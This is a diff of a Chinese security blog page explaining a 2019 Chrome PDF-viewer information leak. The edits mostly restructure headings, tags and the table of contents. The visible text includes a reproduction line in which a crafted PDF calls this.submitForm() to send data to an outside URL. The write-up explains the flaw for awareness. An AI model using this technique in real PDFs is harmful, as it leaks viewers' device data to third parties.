@@ -104,21 +104,21 @@
 
 
 
-<meta name="description" content="前言前些天国外安全团队edgepot.it公开披露了Chrome浏览器通过打开pdf文件造成信息泄露的0day漏洞。一旦用户使用chrome浏览器查看精心构造的pdf文件，便会将用户设备数据回传给攻击者。漏洞成因根据在野利用的恶意PDF发现，造成该漏洞的根源在于chrome内置PDF阅读器未对  this.submitForm()这个Javascript API （Adobe中对该函数的定义是将表">
+<meta name="description" content="前言前些天国外安全团队edgepot.it公开披露了Chrome浏览器通过打开pdf文件造成信息泄露的0day漏洞。一旦用户使用chrome浏览器查看精心构造的pdf文件，便会将用户设备数据回传给攻击者。 漏洞成因根据在野利用的恶意PDF发现，造成该漏洞的根源在于chrome内置PDF阅读器未对  this.submitForm()这个Javascript API （Adobe中对该函数的定义是将">
 <meta name="keywords" content="信息泄露,复现">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Chrome浏览器打开PDF造成的信息泄露">
 <meta property="og:url" content="http://o0o0.club/2019/03/01/Chrome浏览器打开PDF造成的信息泄露/index.html">
 <meta property="og:site_name" content="Guoker">
-<meta property="og:description" content="前言前些天国外安全团队edgepot.it公开披露了Chrome浏览器通过打开pdf文件造成信息泄露的0day漏洞。一旦用户使用chrome浏览器查看精心构造的pdf文件，便会将用户设备数据回传给攻击者。漏洞成因根据在野利用的恶意PDF发现，造成该漏洞的根源在于chrome内置PDF阅读器未对  this.submitForm()这个Javascript API （Adobe中对该函数的定义是将表">
+<meta property="og:description" content="前言前些天国外安全团队edgepot.it公开披露了Chrome浏览器通过打开pdf文件造成信息泄露的0day漏洞。一旦用户使用chrome浏览器查看精心构造的pdf文件，便会将用户设备数据回传给攻击者。 漏洞成因根据在野利用的恶意PDF发现，造成该漏洞的根源在于chrome内置PDF阅读器未对  this.submitForm()这个Javascript API （Adobe中对该函数的定义是将">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://photo.o0o0.club/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1553875408476.jpg">
 <meta property="og:image" content="http://photo.o0o0.club/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1553875425444.jpg">
 <meta property="og:image" content="http://photo.o0o0.club/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1553875449933.jpg">
-<meta property="og:updated_time" content="2019-03-29T16:05:42.437Z">
+<meta property="og:updated_time" content="2019-03-30T14:10:29.228Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Chrome浏览器打开PDF造成的信息泄露">
-<meta name="twitter:description" content="前言前些天国外安全团队edgepot.it公开披露了Chrome浏览器通过打开pdf文件造成信息泄露的0day漏洞。一旦用户使用chrome浏览器查看精心构造的pdf文件，便会将用户设备数据回传给攻击者。漏洞成因根据在野利用的恶意PDF发现，造成该漏洞的根源在于chrome内置PDF阅读器未对  this.submitForm()这个Javascript API （Adobe中对该函数的定义是将表">
+<meta name="twitter:description" content="前言前些天国外安全团队edgepot.it公开披露了Chrome浏览器通过打开pdf文件造成信息泄露的0day漏洞。一旦用户使用chrome浏览器查看精心构造的pdf文件，便会将用户设备数据回传给攻击者。 漏洞成因根据在野利用的恶意PDF发现，造成该漏洞的根源在于chrome内置PDF阅读器未对  this.submitForm()这个Javascript API （Adobe中对该函数的定义是将">
 <meta name="twitter:image" content="http://photo.o0o0.club/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1553875408476.jpg">
 
 
@@ -392,7 +392,8 @@
       
 
       
-        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前些天国外安全团队edgepot.it公开披露了Chrome浏览器通过打开pdf文件造成信息泄露的0day漏洞。一旦用户使用chrome浏览器查看精心构造的pdf文件，便会将用户设备数据回传给攻击者。<br>漏洞成因<br>根据在野利用的恶意PDF发现，造成该漏洞的根源在于chrome内置PDF阅读器未对  this.submitForm()这个Javascript API （Adobe中对该函数的定义是将表单提交到指定URL）的操作进行控制，从而导致漏洞利用。</p>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前些天国外安全团队edgepot.it公开披露了Chrome浏览器通过打开pdf文件造成信息泄露的0day漏洞。一旦用户使用chrome浏览器查看精心构造的pdf文件，便会将用户设备数据回传给攻击者。</p>
+<h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>根据在野利用的恶意PDF发现，造成该漏洞的根源在于chrome内置PDF阅读器未对  this.submitForm()这个Javascript API （Adobe中对该函数的定义是将表单提交到指定URL）的操作进行控制，从而导致漏洞利用。</p>
 <h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>通过调用this.submitForm(‘<a href="http://baidu.com&#39;)即可向任意URL发送数据" target="_blank" rel="noopener">http://baidu.com&#39;)即可向任意URL发送数据</a></p>
 <p><img src="http://photo.o0o0.club/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1553875408476.jpg" alt="构造恶意代码"></p>
 <p><img src="http://photo.o0o0.club/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1553875425444.jpg" alt="请求信息"></p>
@@ -437,7 +438,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/信息泄露-复现/" rel="tag"><i class="fa fa-tag"></i> 信息泄露,复现</a>
+            <a href="/tags/信息泄露/" rel="tag"><i class="fa fa-tag"></i> 信息泄露</a>
+          
+            <a href="/tags/复现/" rel="tag"><i class="fa fa-tag"></i> 复现</a>
           
         </div>
       
@@ -553,7 +556,7 @@
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/index.html">
-                <span class="site-state-item-count">12</span>
+                <span class="site-state-item-count">13</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
@@ -665,7 +668,7 @@ show_date_time();
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞复现"><span class="nav-number">2.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#附加（内置PDF阅读器所支持的JavascriptAPI）"><span class="nav-number">3.</span> <span class="nav-text">附加（内置PDF阅读器所支持的JavascriptAPI）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#安全建议："><span class="nav-number">4.</span> <span class="nav-text">安全建议：</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞成因"><span class="nav-number">2.</span> <span class="nav-text">漏洞成因</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞复现"><span class="nav-number">3.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#附加（内置PDF阅读器所支持的JavascriptAPI）"><span class="nav-number">4.</span> <span class="nav-text">附加（内置PDF阅读器所支持的JavascriptAPI）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#安全建议："><span class="nav-number">5.</span> <span class="nav-text">安全建议：</span></a></li></ol></div>
             
 
           </div>
